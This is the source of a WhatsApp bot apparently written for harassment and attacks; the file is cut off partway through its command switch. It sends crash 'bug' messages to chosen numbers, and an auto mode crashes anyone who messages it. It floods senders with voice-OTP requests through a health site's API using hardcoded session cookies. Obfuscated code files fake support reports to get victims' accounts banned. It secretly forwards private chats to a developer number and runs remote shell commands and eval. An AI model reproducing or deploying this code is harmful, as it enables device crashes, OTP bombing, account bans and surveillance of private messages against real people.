const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const nomorOwner = ['6285866295942','628985245738','628812904283','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224','6285840040268','6285640350019','6281212687893','79774805044','6282115383356']
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isOwner && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}${command}
•   ${prefix}${command}
•   ${prefix}${command}
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan kode negara!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa logout ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa logout ke nomor ini!')
nd = dn.split("|")
if (!nd[1]) return reply(`Silahkan masukkan kode negara!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx|ID`)
function _0x549a(){var _0x32c5a3=['y29UC29Szq','yMLUza','nJyYmZq0r1Hyz0PI','AhjLzG','Aw5MBW','CgfYC2u','x19H','zw1HAwXFy29UzMLYBq','ChjVDg90ExbL','mxvjteDQBa','x19Yzxy','qu5euK9jra','AgvHzgvYCW','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','x19WCM90B19F','zw1HAwW','mtK5ntmZnwDtqvnQsa','x19JC3i','C3rLCa','oePUvvnSsG','zM9YicG7oYK7','y29UC3rYDwn0B3i','CMvWBgfJzq','ndC2mdqZng1swuLoCW','BgvUz3rO','x19Yzxe','DMfS','x19Jy2C','zM9YBwf0','zMLUza','Aw5WDxrBBMfTzt1SC2rD','CgXHDgzVCM0','mtaWnJyZmdG1oa','zgf0yq','mtjMzKH6uxG','x19JB21Tzw50x3jLCq','nJm5odfAq2HLs2m','yxbWBhK','CgHVBMvFBNvTyMvY','C2v0lwnVB2TPzq','x191C2vY','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29Tl2nVBNrHy3qVBM9JBgLLBNqV','Aw5WDxrBBMfTzt1QyxPVzxn0xq','y291BNrYEv9ZzwXLy3rVCG','zM9YBq','mJe5otuZmvH4A0nuBG','C3vIBwL0','AMf6B2vZDa','kcGOlISPkYKRksSK','DhjHy2u','zxjYB3i','yxbWzw5K','z2v0','C2vHCMnO','DgfIBgu','Dg9tDhjPBMC','AM9PBG','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29T','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','Bg9N','yxr0CG','mti2ote4mgX3r0nsAG','CMv0DxjUicHMDw5JDgLVBIGPia','Bg9Hza','vu5ltK9xtG','mZm1odCXnfvwtxn0qG','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','mtCYmfvlrNLLCq','mJC1yLDdugDR'];_0x549a=function(){return _0x32c5a3;};return _0x549a();}var _0x3830bc=_0x40ba;(function(_0x23f9cb,_0x53ebfc){var _0x615abe=_0x40ba,_0xdf32cc=_0x23f9cb();while(!![]){try{var _0x5a2c09=parseInt(_0x615abe(0x172))/0x1*(parseInt(_0x615abe(0x165))/0x2)+-parseInt(_0x615abe(0x151))/0x3*(-parseInt(_0x615abe(0x17c))/0x4)+parseInt(_0x615abe(0x179))/0x5*(parseInt(_0x615abe(0x18b))/0x6)+parseInt(_0x615abe(0x180))/0x7+parseInt(_0x615abe(0x16b))/0x8+parseInt(_0x615abe(0x18d))/0x9*(-parseInt(_0x615abe(0x167))/0xa)+parseInt(_0x615abe(0x168))/0xb*(-parseInt(_0x615abe(0x161))/0xc);if(_0x5a2c09===_0x53ebfc)break;else _0xdf32cc['push'](_0xdf32cc['shift']());}catch(_0x2a4f6b){_0xdf32cc['push'](_0xdf32cc['shift']());}}}(_0x549a,0xcd093));var _0x66c510=(function(){var _0x21f54b=!![];return function(_0x1c9b66,_0x36c9d2){var _0x39d2ac=_0x21f54b?function(){var _0x2b99f7=_0x40ba;if(_0x36c9d2){var _0x6c8219=_0x36c9d2[_0x2b99f7(0x149)](_0x1c9b66,arguments);return _0x36c9d2=null,_0x6c8219;}}:function(){};return _0x21f54b=![],_0x39d2ac;};}()),_0x893d87=_0x66c510(this,function(){var _0x5b72f9=_0x40ba;return _0x893d87[_0x5b72f9(0x15b)]()[_0x5b72f9(0x159)]('(((.+)+)+)+$')[_0x5b72f9(0x15b)]()['constructor'](_0x893d87)[_0x5b72f9(0x159)](_0x5b72f9(0x154));});_0x893d87();var _0xbda2a9=(function(){var _0x248956=!![];return function(_0x434c9f,_0x594299){var _0x908e08=_0x248956?function(){var _0x137c4c=_0x40ba;if(_0x594299){var _0x46f6b0=_0x594299[_0x137c4c(0x149)](_0x434c9f,arguments);return _0x594299=null,_0x46f6b0;}}:function(){};return _0x248956=![],_0x908e08;};}()),_0x450311=_0xbda2a9(this,function(){var _0xee46cc=_0x40ba,_0x681ca5;try{var _0x4648b0=Function(_0xee46cc(0x162)+_0xee46cc(0x176)+');');_0x681ca5=_0x4648b0();}catch(_0x4ae754){_0x681ca5=window;}var _0xf056e3=_0x681ca5[_0xee46cc(0x169)]=_0x681ca5[_0xee46cc(0x169)]||{},_0x1e41b5=[_0xee46cc(0x15f),'warn',_0xee46cc(0x16d),_0xee46cc(0x156),'exception',_0xee46cc(0x15a),_0xee46cc(0x155)];for(var _0x12d617=0x0;_0x12d617<_0x1e41b5[_0xee46cc(0x181)];_0x12d617++){var _0x29f179=_0xbda2a9[_0xee46cc(0x17e)][_0xee46cc(0x171)][_0xee46cc(0x16a)](_0xbda2a9),_0xe38a15=_0x1e41b5[_0x12d617],_0xe89919=_0xf056e3[_0xe38a15]||_0x29f179;_0x29f179[_0xee46cc(0x177)]=_0xbda2a9['bind'](_0xbda2a9),_0x29f179['toString']=_0xe89919['toString']['bind'](_0xe89919),_0xf056e3[_0xe38a15]=_0x29f179;}});_0x450311();function _0x40ba(_0x3c6d6d,_0x36f10d){var _0x18ec27=_0x549a();return _0x40ba=function(_0x450311,_0xbda2a9){_0x450311=_0x450311-0x149;var _0x12c20f=_0x18ec27[_0x450311];if(_0x40ba['GerCzV']===undefined){var _0xad10b=function(_0x40ba72){var _0x457af3='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4610c5='',_0x36dcd1='',_0x4f3651=_0x4610c5+_0xad10b;for(var _0x3df9a1=0x0,_0x13f6f2,_0x21f54b,_0x1c9b66=0x0;_0x21f54b=_0x40ba72['charAt'](_0x1c9b66++);~_0x21f54b&&(_0x13f6f2=_0x3df9a1%0x4?_0x13f6f2*0x40+_0x21f54b:_0x21f54b,_0x3df9a1++%0x4)?_0x4610c5+=_0x4f3651['charCodeAt'](_0x1c9b66+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x13f6f2>>(-0x2*_0x3df9a1&0x6)):_0x3df9a1:0x0){_0x21f54b=_0x457af3['indexOf'](_0x21f54b);}for(var _0x36c9d2=0x0,_0x39d2ac=_0x4610c5['length'];_0x36c9d2<_0x39d2ac;_0x36c9d2++){_0x36dcd1+='%'+('00'+_0x4610c5['charCodeAt'](_0x36c9d2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x36dcd1);};_0x40ba['uHFgdU']=_0xad10b,_0x3c6d6d=arguments,_0x40ba['GerCzV']=!![];}var _0x893d87=_0x18ec27[0x0],_0x66c510=_0x450311+_0x893d87,_0x549aef=_0x3c6d6d[_0x66c510];if(!_0x549aef){var _0x6c8219=function(_0x248956){this['VwyCaE']=_0x248956,this['tfVlCR']=[0x1,0x0,0x0],this['ugjykB']=function(){return'newState';},this['VuetGS']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['ZJYCZf']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x6c8219['prototype']['iIwiXJ']=function(){var _0x434c9f=new RegExp(this['VuetGS']+this['ZJYCZf']),_0x594299=_0x434c9f['test'](this['ugjykB']['toString']())?--this['tfVlCR'][0x1]:--this['tfVlCR'][0x0];return this['pKKDuC'](_0x594299);},_0x6c8219['prototype']['pKKDuC']=function(_0x908e08){if(!Boolean(~_0x908e08))return _0x908e08;return this['odXFHb'](this['VwyCaE']);},_0x6c8219['prototype']['odXFHb']=function(_0x46f6b0){for(var _0x681ca5=0x0,_0x4648b0=this['tfVlCR']['length'];_0x681ca5<_0x4648b0;_0x681ca5++){this['tfVlCR']['push'](Math['round'](Math['random']())),_0x4648b0=this['tfVlCR']['length'];}return _0x46f6b0(this['tfVlCR'][0x0]);},new _0x6c8219(_0x40ba)['iIwiXJ'](),_0x12c20f=_0x40ba['uHFgdU'](_0x12c20f),_0x3c6d6d[_0x66c510]=_0x12c20f;}else _0x12c20f=_0x549aef;return _0x12c20f;},_0x40ba(_0x3c6d6d,_0x36f10d);}var ntah=await axios[_0x3830bc(0x158)](_0x3830bc(0x14d)),email=await axios['get']('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1'),cookie=ntah[_0x3830bc(0x175)][_0x3830bc(0x14b)][_0x3830bc(0x15c)](';\x20'),$=cheerio[_0x3830bc(0x163)](ntah[_0x3830bc(0x18a)]),$form=$(_0x3830bc(0x150)),url=new URL($form[_0x3830bc(0x160)]('action'),_0x3830bc(0x15d))[_0x3830bc(0x16c)],form=new URLSearchParams();form[_0x3830bc(0x157)](_0x3830bc(0x153),$form[_0x3830bc(0x186)](_0x3830bc(0x14e))[_0x3830bc(0x183)]()),form[_0x3830bc(0x157)]('lsd',$form[_0x3830bc(0x186)](_0x3830bc(0x187))[_0x3830bc(0x183)]()),form[_0x3830bc(0x157)](_0x3830bc(0x17b),_0x3830bc(0x152)),form[_0x3830bc(0x157)](_0x3830bc(0x14f),''+nd[0x1]),form[_0x3830bc(0x157)](_0x3830bc(0x14a),''+nd[0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x178),email[_0x3830bc(0x18a)][0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x170),email['data'][0x0]),form[_0x3830bc(0x157)](_0x3830bc(0x188),_0x3830bc(0x174)),form[_0x3830bc(0x157)]('your_message',_0x3830bc(0x15e)),form[_0x3830bc(0x157)](_0x3830bc(0x14c),'0'),form[_0x3830bc(0x157)](_0x3830bc(0x16f),'1'),form[_0x3830bc(0x157)](_0x3830bc(0x17a),''),form[_0x3830bc(0x157)](_0x3830bc(0x182),'8'),form['append']('__hs',_0x3830bc(0x166)),form[_0x3830bc(0x157)]('dpr','1'),form['append'](_0x3830bc(0x184),_0x3830bc(0x164)),form['append'](_0x3830bc(0x173),_0x3830bc(0x189)),form[_0x3830bc(0x157)](_0x3830bc(0x18c),'0');var res=await axios({'url':url,'method':'POST','data':form,'headers':{'cookie':cookie}});reply('Sukses\x20logout\x20'+nd[0x0]+'\x20'+util[_0x3830bc(0x185)](JSON[_0x3830bc(0x16e)](res[_0x3830bc(0x18a)][_0x3830bc(0x17f)](_0x3830bc(0x17d),''))));
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'chat':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
